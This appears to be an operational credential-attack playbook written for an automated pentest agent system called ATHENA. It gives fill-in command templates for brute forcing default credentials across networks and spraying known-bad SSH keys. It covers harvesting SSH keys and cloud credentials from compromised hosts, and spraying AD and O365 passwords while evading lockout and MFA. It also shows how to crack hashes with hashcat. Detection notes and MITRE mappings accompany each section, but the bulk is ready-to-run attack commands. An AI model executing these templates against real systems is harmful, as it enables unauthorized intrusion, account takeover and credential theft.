# ATHENA Credential Attack Playbook
**Version:** 1.0
**Date:** 2026-02-26
**Classification:** RESTRICTED - Authorized Pentest Use Only
**Sources:** Praetorian Blog Knowledge Base, LOTL Ecosystem Research, HackTricks AD Methodology
**Maintained by:** ATHENA Agent Knowledge System

---

## Overview

This playbook covers the full credential attack lifecycle from initial default credential testing through hash cracking, credential harvesting, token theft, and NTLM relay/capture techniques. Each technique includes ATHENA-ready command templates with placeholder variables that agents substitute at runtime.

### Variable Convention

| Variable | Meaning |
|---|---|
| `$TARGET` | Single target IP or hostname |
| `$TARGET_RANGE` | CIDR range (e.g., `10.0.0.0/24`) |
| `$DOMAIN` | Active Directory domain (e.g., `corp.local`) |
| `$DC_IP` | Domain controller IP address |
| `$USERNAME` | Target username |
| `$PASSWORD` | Target password |
| `$HASH` | NTLM hash (format: `aad3b...`) |
| `$WORDLIST` | Path to password wordlist |
| `$USERLIST` | Path to username list |
| `$ATTACKER_IP` | ATHENA agent/attacker machine IP |
| `$OUTPUT_DIR` | Directory for output files |
| `$DOMAIN_USER` | Authenticated domain user (`DOMAIN\user`) |

---

## Section 1: Default Credential Testing

### 1.1 Brutus Pipeline - Full Network Default Credential Audit

**Objective:** Systematically identify services across the target network that are using default or weak credentials without needing to manage protocol-specific tooling.

**Prerequisites:**
- Network access to target range
- Brutus v1.1.0+ installed (single Go binary, zero dependencies)
- Naabu installed (fast port scanner)
- FingerprintX installed (service protocol fingerprinter)

**Tools:**
- `brutus` v1.1.0 (github.com/praetorian-inc/brutus) - 24 protocol support
- `naabu` v2.x (github.com/projectdiscovery/naabu) - port scanner
- `fingerprintx` v1.x (github.com/praetorian-inc/fingerprintx) - service fingerprinter

**Procedure:**

Step 1 - Full pipeline for common service ports:
```bash
naabu -host $TARGET_RANGE \
  -p 22,23,25,80,110,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,9090,27017 \
  -silent \
  -o $OUTPUT_DIR/open-ports.txt | \
  fingerprintx --json | \
  brutus --json > $OUTPUT_DIR/brutus-results.json
```

Step 2 - Parse successful authentications:
```bash
cat $OUTPUT_DIR/brutus-results.json | jq '.[] | select(.success==true)' | \
  tee $OUTPUT_DIR/valid-default-creds.json
```

Step 3 - Summary report:
```bash
cat $OUTPUT_DIR/valid-default-creds.json | \
  jq -r '[.host, .port, .protocol, .username, .password] | @tsv' | \
  column -t
```

**Detection:** Network IDS signatures for rapid sequential authentication failures, unusual protocol authentication patterns. Defenders catch this via failed auth event bursts in SIEM. Brutus rate-limits by default to reduce detection noise.

**MITRE ATT&CK:** T1110.001 (Brute Force: Password Guessing), T1078 (Valid Accounts), T1552 (Unsecured Credentials)

---

### 1.2 Default Credentials by Service - SSH

**Objective:** Test SSH services for manufacturer/vendor default credentials and well-known insecure key pairs compiled into Brutus.

**Prerequisites:** Network access to port 22, Brutus or Hydra, known-bad SSH key list

**Tools:**
- `brutus` v1.1.0 (embedded Rapid7 ssh-badkeys database compiled in)
- `hydra` (fallback if Brutus unavailable)
- `nmap` with `ssh-brute` NSE script

**Procedure:**

Step 1 - Identify all SSH services on target range:
```bash
naabu -host $TARGET_RANGE -p 22 -silent | \
  fingerprintx --json | \
  jq -r '.[] | select(.port==22) | .host' > $OUTPUT_DIR/ssh-targets.txt
```

Step 2 - Test known-bad SSH keys (Brutus embedded method - auto-tests all compiled keys):
```bash
naabu -host $TARGET_RANGE -p 22 -silent | \
  fingerprintx --json | \
  brutus --json -protocol ssh > $OUTPUT_DIR/ssh-badkey-results.json
```

Step 3 - Test common SSH password defaults:
```bash
brutus \
  -target $TARGET \
  -port 22 \
  -protocol ssh \
  -u root,admin,ubuntu,debian,pi,vagrant,ec2-user,centos,oracle,git,deploy,ansible \
  -p root,admin,toor,password,12345,raspberry,vagrant,changeme,default,letmein \
  --json > $OUTPUT_DIR/ssh-password-results.json
```

Step 4 - Alternative with Hydra for custom lists:
```bash
hydra -L $USERLIST -P $WORDLIST \
  -t 4 \
  -o $OUTPUT_DIR/hydra-ssh.txt \
  $TARGET ssh
```

**Known-Bad SSH Keys (Brutus Embedded - Auto-Tested):**

| Vendor/Product | Username | CVE/Source | Notes |
|---|---|---|---|
| F5 BIG-IP | root | Rapid7 ssh-badkeys | Network load balancer default |
| HashiCorp Vagrant | vagrant | HashiCorp official | Dev environment key |
| ExaGrid Backup Appliance | exaadmin | Rapid7 ssh-badkeys | Backup appliance |
| Ceragon FibeAir IP-10 | mateidu | Rapid7 ssh-badkeys | Microwave transport |
| Barracuda appliances | (appliance-specific) | Rapid7 ssh-badkeys | Multiple products |
| Array Networks | (appliance-specific) | Rapid7 ssh-badkeys | SSL VPN appliances |
| Cisco (some models) | cisco | ICS-CERT | IoT/embedded |
| Moxa industrial | moxa | ICS-CERT | Industrial networking |

**Common SSH Default Credential Matrix:**

| Service/Product | Default Username | Default Password |
|---|---|---|
| Ubuntu cloud images | ubuntu | (key auth only) |
| Debian cloud images | admin / root | (key auth only) |
| Raspberry Pi OS | pi | raspberry |
| Router Linux (generic) | admin | admin / password |
| Vagrant boxes | vagrant | vagrant |
| Docker toolbox VMs | docker | tcuser |
| Bitnami stacks | bitnami | bitnami |
| OpenWRT | root | (empty) |
| pfSense | admin | pfsense |
| Synology NAS | admin | (empty) |

**Detection:** SSH auth failure logs (`/var/log/auth.log`), `fail2ban` triggers, rapid sequential connection attempts from single source. Event ID 4625 equivalent on Windows SSH.

**MITRE ATT&CK:** T1110.001 (Password Guessing), T1078.001 (Default Accounts), T1552.004 (Private Keys)

---

### 1.3 Default Credentials by Service - Databases and Caches

**Objective:** Identify database services accepting default or empty credentials enabling direct data access or lateral movement.

**Prerequisites:** Network access to database ports, Brutus or service-specific clients

**Tools:** `brutus`, `mysql`, `psql`, `redis-cli`, `mongosh`, `sqlcmd`

**Procedure:**

Step 1 - Discover database services:
```bash
naabu -host $TARGET_RANGE \
  -p 1433,1521,3306,5432,6379,27017,5984,9200,9300 \
  -silent | \
  fingerprintx --json > $OUTPUT_DIR/db-services.json
```

Step 2 - Brutus automated default credential test across all discovered DBs:
```bash
cat $OUTPUT_DIR/db-services.json | \
  brutus --json \
  -u root,admin,sa,postgres,mysql,oracle,mongodb,couchdb \
  -p '',root,admin,password,password123,sa,postgres,mysql,oracle,changeme \
  > $OUTPUT_DIR/db-cred-results.json
```

Step 3 - Manual verification for Redis (often auth-free):
```bash
redis-cli -h $TARGET -p 6379 ping
redis-cli -h $TARGET -p 6379 info server
redis-cli -h $TARGET -p 6379 config get dir
```

Step 4 - Manual verification for unauthenticated MongoDB:
```bash
mongosh --host $TARGET --port 27017 --eval "db.adminCommand('listDatabases')"
```

Step 5 - Elasticsearch check (common auth bypass):
```bash
curl -s http://$TARGET:9200/_cluster/health
curl -s http://$TARGET:9200/_cat/indices?v
```

**Database Default Credential Matrix:**

| Database | Default Username | Default Password | Notes |
|---|---|---|---|
| MySQL/MariaDB | root | (empty) | Extremely common on dev systems |
| PostgreSQL | postgres | postgres | Also try (empty) password |
| Microsoft SQL Server | sa | (empty) or sa | Mixed mode auth required |
| Oracle DB | sys | change_on_install | Also: system/manager |
| MongoDB | (none) | (none) | Auth often disabled by default |
| Redis | (none) | (none) | No auth by default pre-7.0 |
| CouchDB | admin | admin | Or check /_all_dbs without auth |
| Elasticsearch | elastic | (empty) or changeme | Pre-8.0 often open |
| Cassandra | cassandra | cassandra | Default JMX also open |
| InfluxDB | admin | admin | Also try empty password |
| Neo4j | neo4j | neo4j | Forces password change on first login |

**Detection:** Database audit logs, failed login monitoring, Elastic Security SIEM rules for DB auth failures. Redis and MongoDB often have zero logging without explicit configuration.

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1078 (Valid Accounts), T1005 (Data from Local System)

---

### 1.4 Default Credentials by Service - Network Protocols (SNMP, RDP, VNC)

**Objective:** Test network management protocols and remote desktop services for default credentials enabling full system control.

**Prerequisites:** Network access, SNMP community string wordlist, Brutus or specialized tools

**Tools:** `brutus`, `snmpwalk`, `onesixtyone`, `crowbar`, `xfreerdp`, `vncviewer`

**Procedure - SNMP:**

Step 1 - Discover SNMP services:
```bash
naabu -host $TARGET_RANGE -p 161 -udp -silent > $OUTPUT_DIR/snmp-targets.txt
```

Step 2 - Test common community strings:
```bash
onesixtyone -c /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt \
  -i $OUTPUT_DIR/snmp-targets.txt \
  -o $OUTPUT_DIR/snmp-results.txt
```

Step 3 - Dump SNMP data from responsive targets:
```bash
snmpwalk -v2c -c public $TARGET .1.3.6.1.2.1 2>/dev/null > $OUTPUT_DIR/snmp-dump-$TARGET.txt
snmpwalk -v2c -c private $TARGET .1.3.6.1.2.1 2>/dev/null >> $OUTPUT_DIR/snmp-dump-$TARGET.txt
```

**Common SNMP Community Strings:**
```
public, private, community, manager, secret, admin, password, cisco, snmp, monitor,
internal, default, readonly, readwrite, write, all private, 0, test, network, switch
```

**Procedure - RDP:**

Step 1 - Discover RDP services:
```bash
naabu -host $TARGET_RANGE -p 3389 -silent > $OUTPUT_DIR/rdp-targets.txt
```

Step 2 - Test default credentials with Brutus:
```bash
brutus \
  -target $TARGET \
  -port 3389 \
  -protocol rdp \
  -u Administrator,admin,Guest \
  -p '',password,Password1,Admin123,Welcome1,P@ssw0rd \
  --json > $OUTPUT_DIR/rdp-results.json
```

**Procedure - VNC:**

Step 1 - Discover VNC services:
```bash
naabu -host $TARGET_RANGE -p 5900,5901,5902,5903 -silent | \
  fingerprintx --json > $OUTPUT_DIR/vnc-services.json
```

Step 2 - Test common VNC passwords (VNC uses password-only auth):
```bash
brutus \
  -target $TARGET \
  -port 5900 \
  -protocol vnc \
  -p '',password,admin,vnc,1234,12345,vncpassword \
  --json > $OUTPUT_DIR/vnc-results.json
```

**Detection:** Windows Event ID 4625 (failed RDP logon), NPS Network Policy Server logs, VNC server logs. SNMP detection via anomaly in query volume.

**MITRE ATT&CK:** T1021.001 (Remote Desktop Protocol), T1021.005 (VNC), T1040 (Network Sniffing for SNMP v1/v2 community strings)

---

### 1.5 Web Admin Panel Default Credentials

**Objective:** Identify administrative web interfaces using default credentials enabling complete system control through a browser-based interface.

**Prerequisites:** Discovered web services, Brutus or Burp Suite, knowledge of target technology stack

**Tools:** `brutus` (AI-powered admin panel feature), `naabu`, `httpx`, `whatweb`, `nikto`

**Procedure:**

Step 1 - Discover all web services:
```bash
naabu -host $TARGET_RANGE \
  -p 80,443,3000,4000,4848,8080,8443,8888,9090,9200,9300,10000,50000 \
  -silent | \
  fingerprintx --json > $OUTPUT_DIR/web-services.json
```

Step 2 - Fingerprint web technologies:
```bash
cat $OUTPUT_DIR/web-services.json | jq -r '.[] | .host + ":" + (.port|tostring)' | \
  httpx -title -tech-detect -status-code -content-type \
  -o $OUTPUT_DIR/web-fingerprint.json
```

Step 3 - Brutus automated admin panel testing (AI-powered detection experimental feature):
```bash
cat $OUTPUT_DIR/web-services.json | \
  fingerprintx --json | \
  brutus --json \
  > $OUTPUT_DIR/web-admin-results.json
```

Step 4 - Manual targeted testing by identified technology:
```bash
# Apache Tomcat Manager
curl -u tomcat:tomcat http://$TARGET:8080/manager/html 2>/dev/null
curl -u admin:admin http://$TARGET:8080/manager/html 2>/dev/null
curl -u manager:manager http://$TARGET:8080/manager/html 2>/dev/null

# Jenkins
curl -u admin:admin http://$TARGET:8080/api/json 2>/dev/null

# Grafana
curl -u admin:admin http://$TARGET:3000/api/org 2>/dev/null

# phpMyAdmin - try via browser or curl with form POST
curl -c /tmp/pma-cookies.txt \
  -d "pma_username=root&pma_password=&server=1" \
  http://$TARGET/phpmyadmin/index.php
```

**Web Admin Default Credential Matrix:**

| Application | Default Username | Default Password | Admin Path |
|---|---|---|---|
| Apache Tomcat | tomcat | tomcat | /manager/html |
| Apache Tomcat | admin | admin | /manager/html |
| Apache Tomcat | manager | manager | /manager/html |
| Jenkins | admin | admin | /login |
| Jenkins | (from /initialAdminPassword) | (generated) | /login |
| phpMyAdmin | root | (empty) | /phpmyadmin |
| Grafana | admin | admin | /login |
| Kibana | elastic | changeme | /login |
| Elasticsearch | elastic | (empty) | / |
| Consul | (token-based) | master | /ui |
| Portainer | admin | (set on first run) | / |
| Rancher | admin | admin | / |
| Kubernetes Dashboard | (token or skip) | (none) | / |
| SonarQube | admin | admin | /sessions/new |
| Nexus Repository | admin | admin123 | / |
| JFrog Artifactory | admin | password | / |
| GitLab | root | 5iveL!fe | /users/sign_in |
| Gogs | (admin set on install) | | / |
| Webmin | root | (host root password) | / |
| pfSense | admin | pfsense | / |
| OpenWRT | root | (empty) | / |
| DD-WRT | root | admin | / |
| Cisco IOS Web | admin | admin | / |
| Fortinet | admin | (empty) | / |
| Palo Alto | admin | admin | / |
| PRTG | prtgadmin | prtgadmin | / |
| Zabbix | Admin | zabbix | /zabbix |
| Nagios | nagiosadmin | nagios | / |
| Splunk | admin | changeme | / |
| ManageEngine | admin | admin | / |
| Jira | admin | admin | / |

**Detection:** Web server access logs, WAF alerts on repeated 401/403 responses from same source IP, application-level brute force detection. Brutus implements delays to reduce detection probability.

**MITRE ATT&CK:** T1110.001 (Password Guessing), T1078.001 (Default Accounts), T1133 (External Remote Services)

---

## Section 2: SSH Key Spray

### 2.1 Known-Bad SSH Key Spray (Rapid7 ssh-badkeys)

**Objective:** Authenticate to SSH services using publicly known private keys that vendors shipped in firmware or appliance images, granting immediate root-level access.

**Prerequisites:** Brutus with embedded key database, or manual Rapid7 ssh-badkeys repo clone, network access to SSH targets

**Tools:**
- `brutus` v1.1.0 (embedded ssh-badkeys, auto-tests on every SSH target)
- `ssh-badkeys` repo: github.com/rapid7/ssh-badkeys (manual key extraction)
- `naabu`, `fingerprintx`

**Procedure:**

Step 1 - Full SSH bad-key spray via Brutus pipeline (recommended - all keys tested automatically):
```bash
naabu -host $TARGET_RANGE -p 22 -silent | \
  fingerprintx --json | \
  brutus --json > $OUTPUT_DIR/ssh-badkey-spray.json
```

Step 2 - Parse results for successful key authentications:
```bash
cat $OUTPUT_DIR/ssh-badkey-spray.json | \
  jq '.[] | select(.success==true and .auth_method=="publickey") |
    {host: .host, username: .username, key_source: .credential_source}' | \
  tee $OUTPUT_DIR/ssh-badkey-hits.json
```

Step 3 - Alternative: Manual spray using Rapid7 ssh-badkeys repo:
```bash
# Clone the repo
git clone https://github.com/rapid7/ssh-badkeys /opt/ssh-badkeys

# Spray a specific known-bad key across the range
for HOST in $(cat $OUTPUT_DIR/ssh-targets.txt); do
  ssh -o StrictHostKeyChecking=no \
      -o ConnectTimeout=3 \
      -o BatchMode=yes \
      -i /opt/ssh-badkeys/authorized/f5-bigip-2012.key \
      root@$HOST "id; hostname" 2>/dev/null \
      && echo "[+] HIT: root@$HOST" | tee -a $OUTPUT_DIR/badkey-hits.txt
done
```

Step 4 - Verify access on hits and establish persistence:
```bash
ssh -i /opt/ssh-badkeys/authorized/$KEY_FILE root@$TARGET
```

**Rapid7 ssh-badkeys Notable Entries:**

| Key ID | Vendor | Product | Username | Risk |
|---|---|---|---|---|
| f5-bigip-2012.key | F5 Networks | BIG-IP appliances | root | CRITICAL |
| vagrant.key | HashiCorp | Vagrant VMs | vagrant | HIGH |
| exagrid.key | ExaGrid | Backup appliances | (appliance-specific) | CRITICAL |
| ceragon-fibeair.key | Ceragon | FibeAir IP-10 | mateidu | HIGH |
| barracuda-*.key | Barracuda | Various appliances | (appliance-specific) | CRITICAL |
| array-networks.key | Array Networks | SSL VPN | (appliance-specific) | CRITICAL |
| cisco-asa-*.key | Cisco | Some ASA models | cisco | CRITICAL |

**Detection:** SSH server logs show authentication type "publickey" with username. Unexpected successful key auths from unknown sources. Intrusion detection via Zeek/Suricata `ssh-known-hosts` comparison.

**MITRE ATT&CK:** T1078.001 (Default Accounts), T1552.004 (Private Keys), T1021.004 (Remote Services: SSH)

---

### 2.2 Post-Compromise SSH Key Reuse Across Network

**Objective:** After compromising a system with SSH keys, identify which other systems those keys grant access to, enabling rapid lateral movement through the environment.

**Prerequisites:** Previously compromised system with SSH keys, naabu and Brutus on attacker machine

**Tools:** `brutus`, `ssh`, `find` (for key discovery on compromised host)

**Procedure:**

Step 1 - Locate all SSH private keys on compromised system:
```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \
  -o -name "*.pem" -o -name "*.key" 2>/dev/null | \
  xargs -I{} file {} | grep "PEM\|private" | cut -d: -f1 | \
  tee /tmp/found-keys.txt
```

Step 2 - Also check common deployment key locations:
```bash
# CI/CD and automation keys
ls -la /var/lib/jenkins/.ssh/ 2>/dev/null
ls -la /home/deploy/.ssh/ 2>/dev/null
ls -la /opt/nessus/.ssh/ 2>/dev/null
ls -la /etc/ansible/.ssh/ 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null

# AWS and cloud provider keys
ls -la ~/.aws/credentials 2>/dev/null
cat ~/.aws/credentials 2>/dev/null
env | grep -i "ssh\|key\|deploy" 2>/dev/null
```

Step 3 - Check known_hosts for network topology intel:
```bash
cat ~/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | tr ',' '\n' | sort -u
cat /etc/ssh/ssh_known_hosts 2>/dev/null | awk '{print $1}' | tr ',' '\n' | sort -u
```

Step 4 - Spray each discovered key across the network with Brutus (from ATTACKER machine, exfiltrate keys first):
```bash
# For each key found on compromised host, test against entire range
naabu -host $TARGET_RANGE -p 22 -silent | \
  fingerprintx --json | \
  brutus \
    -u root,admin,ubuntu,ec2-user,centos,git,deploy,ansible,vagrant,jenkins \
    -k /path/to/exfiltrated/id_rsa \
    --json > $OUTPUT_DIR/key-spray-$KEY_NAME.json
```

Step 5 - Parse and prioritize results:
```bash
cat $OUTPUT_DIR/key-spray-*.json | \
  jq -s '[.[] | .[] | select(.success==true)]' | \
  jq 'sort_by(.host)' | \
  tee $OUTPUT_DIR/all-key-spray-hits.json

# Count hits per key to prioritize
cat $OUTPUT_DIR/key-spray-*.json | \
  jq -r 'select(.success==true) | .credential_source' | \
  sort | uniq -c | sort -rn
```

**Common Key Locations by System Role:**

| System Role | Key Path | Common Username |
|---|---|---|
| Nessus/Tenable scanner | /opt/nessus/.ssh/ | root |
| Jenkins CI server | /var/lib/jenkins/.ssh/ | jenkins |
| Ansible control node | /home/ansible/.ssh/, /etc/ansible/.ssh/ | ansible |
| Kubernetes node | /root/.ssh/, /home/ubuntu/.ssh/ | root, ubuntu |
| GitHub Actions runner | /home/runner/.ssh/ | runner |
| Deploy/deployment server | /home/deploy/.ssh/ | deploy |
| Bastion/jump host | /root/.ssh/ (contains all target keys) | root |
| AWS EC2 instances | ~/.aws/credentials (key pair) | ec2-user |

**Detection:** SSH auth logs show successful key authentication from unusual source IPs, especially if the key is normally used from a specific jump host or scanner. Privileged access workstation (PAW) monitoring alerts.

**MITRE ATT&CK:** T1021.004 (Remote Services: SSH), T1552.004 (Private Keys), T1078 (Valid Accounts)

---

## Section 3: Password Spraying

### 3.1 Active Directory Password Spraying

**Objective:** Identify valid domain credentials by testing a small number of common passwords against all domain accounts while staying below lockout thresholds.

**Prerequisites:** Network access to domain, valid domain account list (or ability to enumerate via LDAP/Kerberos), knowledge of account lockout policy

**Tools:**
- `kerbrute` (github.com/ropnop/kerbrute) - Kerberos-based, no LDAP/SMB required
- `sprayhound` (github.com/Hackndo/sprayhound) - lockout-aware, integrates BloodHound
- `CrackMapExec` / `NetExec` - SMB/LDAP spray

**Procedure:**

Step 1 - Enumerate account lockout policy FIRST (mandatory before spraying):
```bash
# Via crackmapexec with valid creds
crackmapexec smb $DC_IP -u $USERNAME -p $PASSWORD --pass-pol

# Via net (if on domain-joined Windows)
net accounts /domain

# Via LDAP (impacket)
ldapdomaindump -u "$DOMAIN\\$USERNAME" -p $PASSWORD $DC_IP -o $OUTPUT_DIR/ldap-dump/
cat $OUTPUT_DIR/ldap-dump/domain_policy.json | \
  jq '{lockout_threshold: .lockoutThreshold, observation_window: .lockoutObservationWindow}'
```

Step 2 - Enumerate domain users (required for targeted spray):
```bash
# Kerberos enumeration (no auth required)
kerbrute userenum \
  --dc $DC_IP \
  --domain $DOMAIN \
  $USERLIST \
  -o $OUTPUT_DIR/valid-users.txt

# LDAP dump (requires valid creds)
ldapdomaindump -u "$DOMAIN\\$USERNAME" -p $PASSWORD \
  $DC_IP -o $OUTPUT_DIR/ldap-dump/
cat $OUTPUT_DIR/ldap-dump/domain_users.grep | awk '{print $3}' > $OUTPUT_DIR/all-domain-users.txt
```

Step 3 - Build password candidates based on organization context:
```bash
# Organization name variations
ORGNAME="AcmeCorp"
cat > /tmp/spray-passwords.txt << EOF
${ORGNAME}2024!
${ORGNAME}2025!
${ORGNAME}2026!
Spring2025!
Summer2025!
Fall2025!
Winter2025!
Spring2026!
Password1!
Welcome1!
P@ssword1
P@ssw0rd1
Monday1!
Welcome@2025
Company2025!
EOF
```

Step 4 - Kerbrute spray (stealth option - uses Kerberos pre-auth, no failed logon Event IDs on DCs):
```bash
kerbrute passwordspray \
  --dc $DC_IP \
  --domain $DOMAIN \
  $OUTPUT_DIR/valid-users.txt \
  "Spring2026!" \
  --delay 1000 \
  -o $OUTPUT_DIR/kerbrute-spray-spring2026.txt
```

Step 5 - CrackMapExec spray (generates Windows event IDs but has broader protocol support):
```bash
# Spray one password - NEVER spray more than (threshold-1) per observation window
crackmapexec smb $DC_IP \
  -u $OUTPUT_DIR/valid-users.txt \
  -p "Spring2026!" \
  --continue-on-success \
  -o $OUTPUT_DIR/cme-spray-spring2026.txt

# Wait observation window period before next spray
# (if policy = 30min window, wait 31 minutes between password attempts per account)
```

Step 6 - Sprayhound (lockout-aware with BloodHound integration):
```bash
sprayhound \
  -U $OUTPUT_DIR/valid-users.txt \
  -p "Spring2026!" \
  -d $DOMAIN \
  -dc $DC_IP \
  --lower-threshold 2 \
  -o $OUTPUT_DIR/sprayhound-results.txt
```

Step 7 - Parse and validate hits:
```bash
grep -i "success\|\[\+\]" $OUTPUT_DIR/kerbrute-spray-*.txt $OUTPUT_DIR/cme-spray-*.txt | \
  tee $OUTPUT_DIR/spray-hits.txt
```

**Lockout-Safe Timing Guidelines:**

| Lockout Threshold | Observation Window | Safe Spray Rate |
|---|---|---|
| 5 attempts | 30 min | 1 password per 31 minutes |
| 10 attempts | 30 min | 1 password per 15 minutes |
| 3 attempts | 30 min | 1 password per 35 minutes |
| 0 (no lockout) | N/A | Standard rate (still delay for stealth) |

**Common Password Patterns for AD Environments:**

| Pattern | Examples | Effectiveness |
|---|---|---|
| Season + Year + Special | Spring2026!, Summer2025! | High - very common corporate pattern |
| Company + Year + Special | Acmecorp2026!, Corp2025! | High - policy-compliant variation |
| Welcome pattern | Welcome1!, Welcome@2024 | Medium - common initial passwords |
| Month + Year | January2026!, Jan@2026 | Medium - password change pattern |
| Day pattern | Monday1!, Friday@2025 | Low-Medium - clever users |
| Default IT patterns | Password1!, P@ssw0rd1 | Medium - lazy IT departments |
| Keyboard walks | Qwerty123!, Qwerty@1 | Medium - common user behavior |

**Detection:** Windows Event ID 4625 (failed logon, type 3 from network), 4771 (Kerberos pre-auth failure). Kerbrute leaves Kerberos-only footprint (4771, not 4625). Microsoft Defender for Identity (MDI) detects password spray patterns via baseline deviation. Sprayhound designed to stay below MDI detection threshold.

**MITRE ATT&CK:** T1110.003 (Password Spraying), T1078.002 (Domain Accounts)

---

### 3.2 O365 and Azure AD Password Spraying

**Objective:** Gain access to Microsoft cloud services (O365, SharePoint, Teams, Azure) without triggering lockout or MFA prompts by targeting legacy authentication endpoints.

**Prerequisites:** Target domain name, user list with UPN format (user@domain.com), understanding of target's MFA deployment

**Tools:**
- `MSOLSpray` (github.com/dafthack/MSOLSpray) - O365-specific, smart auth endpoint
- `trevorspray` (github.com/blacklanternsecurity/trevorspray) - lockout-aware, multi-endpoint
- `o365spray` (github.com/0xZDH/o365spray) - enumeration + spray framework
- `fireprox` - rotating AWS API Gateway IPs for evasion

**Procedure:**

Step 1 - Validate target uses O365/Azure AD:
```bash
# Check MX records for Exchange Online
dig MX $DOMAIN | grep -i "mail.protection.outlook.com"

# Check if tenant exists
curl -s "https://login.microsoftonline.com/$DOMAIN/.well-known/openid-configuration" | \
  jq '.token_endpoint'

# Enumerate tenant information
o365spray --validate --domain $DOMAIN
```

Step 2 - Enumerate valid users (before spraying - reduces lockout risk):
```bash
# o365spray user enumeration (uses multiple methods)
o365spray --enum \
  --userfile $USERLIST \
  --domain $DOMAIN \
  -o $OUTPUT_DIR/o365-valid-users.txt

# Alternative: office.com enumeration method
o365spray --enum \
  --userfile $USERLIST \
  --domain $DOMAIN \
  --enum-module office \
  -o $OUTPUT_DIR/o365-valid-users-office.txt
```

Step 3 - Password spray with MSOLSpray:
```bash
python3 MSOLSpray.py \
  --userlist $OUTPUT_DIR/o365-valid-users.txt \
  --password "Spring2026!" \
  --out $OUTPUT_DIR/msol-spray-results.txt
```

Step 4 - Trevorspray for advanced lockout-aware spraying:
```bash
# Trevorspray with ADFS endpoint (bypasses some MFA)
trevorspray \
  -u $OUTPUT_DIR/o365-valid-users.txt \
  -p "Spring2026!" \
  --ssh $PROXY_HOST \
  --delay 30 \
  -o $OUTPUT_DIR/trevorspray-results.txt

# Target legacy auth endpoint (BasicAuth - MFA not enforced)
trevorspray \
  -u $OUTPUT_DIR/o365-valid-users.txt \
  -p "Spring2026!" \
  --url "https://outlook.office365.com/mapi/emsmdb/?MailboxId=$UPN" \
  --delay 60
```

Step 5 - Validate credentials and check MFA status:
```bash
# Test credentials via Graph API
TOKEN=$(curl -s -X POST \
  "https://login.microsoftonline.com/$DOMAIN/oauth2/token" \
  -d "grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&resource=https%3A%2F%2Fgraph.microsoft.com%2F&username=$USERNAME@$DOMAIN&password=$PASSWORD" | \
  jq -r '.access_token')

# If token returned, MFA not enforced for this account/endpoint
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me"
```

**Azure AD Legacy Auth Endpoints (MFA Often Not Enforced):**

| Endpoint | Protocol | Notes |
|---|---|---|
| `https://outlook.office365.com/mapi/emsmdb/` | MAPI over HTTP | Exchange email access |
| `https://outlook.office365.com/EWS/Exchange.asmx` | EWS | Exchange Web Services |
| `https://outlook.office.com/autodiscover/autodiscover.json` | AutoDiscover | Client configuration |
| `https://login.microsoftonline.com/{tenant}/oauth2/token` | ROPC OAuth2 | Direct token grant |
| `https://autologon.microsoftazuread-sso.com/{tenant}/winauth/` | Windows SSO | On-prem SSO endpoint |

**Detection:** Azure AD Sign-in logs (risky sign-ins blade), Microsoft Defender for Identity alerts "Suspected Brute-force attack (Kerberos, NTLM)", Azure Sentinel analytics rules for spray patterns. Legacy auth endpoint spray is specifically detected by "Sign-ins using legacy authentication protocols" alert.

**MITRE ATT&CK:** T1110.003 (Password Spraying), T1078.004 (Cloud Accounts), T1556.006 (Modify Authentication Process: Multi-Factor Authentication)

---

## Section 4: Hash Cracking

### 4.1 Hashcat Modes and Configurations

**Objective:** Recover plaintext passwords from captured hashes using optimized GPU-accelerated cracking to enable direct credential reuse.

**Prerequisites:** Captured hashes (from Responder, secretsdump, Kerberoast, etc.), hashcat installed, wordlists and rules

**Tools:**
- `hashcat` (latest) - GPU-accelerated, primary cracking tool
- `john` (John the Ripper) - CPU fallback, unique rules
- `haiti` (github.com/noraj/haiti) - hash type identification

**Hashcat Mode Reference:**

| Hash Type | Hashcat Mode | Example Source | Priority |
|---|---|---|---|
| NTLM | 1000 | secretsdump, mimikatz | HIGH |
| NetNTLMv2 (NTLMv2) | 5600 | Responder, ntlmrelayx | HIGH |
| NetNTLMv1 (NTLMv1) | 5500 | Responder (downgrade) | CRITICAL |
| Kerberoast (RC4/TGS) | 13100 | GetUserSPNs.py | HIGH |
| Kerberoast (AES256) | 19600 | GetUserSPNs.py | MEDIUM |
| AS-REP Roast | 18200 | GetNPUsers.py | HIGH |
| MSSQL 2012+ | 1731 | SQL Server auth | MEDIUM |
| Bcrypt | 3200 | Linux web app passwords | LOW (slow) |
| SHA-512 crypt (Linux) | 1800 | /etc/shadow | MEDIUM |
| MD5 crypt (Linux) | 500 | /etc/shadow | HIGH |
| SHA-256 crypt (Linux) | 7400 | /etc/shadow | MEDIUM |
| DPAPI Masterkey | 15900 | Windows user secrets | HIGH |
| WPA-PBKDF2 | 22000 | WiFi capture | MEDIUM |

**Procedure - NTLM Hash Cracking (from secretsdump):**

Step 1 - Prepare hash file (extract NTLM hashes from secretsdump output):
```bash
# secretsdump output format: username:RID:LM_hash:NTLM_hash:::
grep -v "^\$" $OUTPUT_DIR/secretsdump.txt | \
  awk -F: '{print $4}' | \
  sort -u > $OUTPUT_DIR/ntlm-hashes.txt

# Create user:hash pairs for context
grep -v "^\$" $OUTPUT_DIR/secretsdump.txt | \
  awk -F: '{print $1":"$4}' > $OUTPUT_DIR/ntlm-with-usernames.txt
```

Step 2 - Quick win: Dictionary attack with best wordlist + rules:
```bash
hashcat -m 1000 \
  $OUTPUT_DIR/ntlm-hashes.txt \
  /opt/wordlists/rockyou.txt \
  -r /opt/hashcat/rules/OneRuleToRuleThemAll.rule \
  -o $OUTPUT_DIR/ntlm-cracked.txt \
  --status --status-timer 60 \
  -O  # Optimized kernel (faster, shorter passwords)
```

Step 3 - Corporate password patterns (season+year+special):
```bash
# Generate corporate password wordlist with CeWL + Hashcat masks
cat > /tmp/corporate-masks.txt << 'EOF'
Spring2024!
Summer2024!
Fall2024!
Winter2024!
Spring2025!
Summer2025!
Fall2025!
Winter2025!
Spring2026!
Summer2026!
EOF

hashcat -m 1000 \
  $OUTPUT_DIR/ntlm-hashes.txt \
  /tmp/corporate-masks.txt \
  -o $OUTPUT_DIR/ntlm-corporate-cracked.txt
```

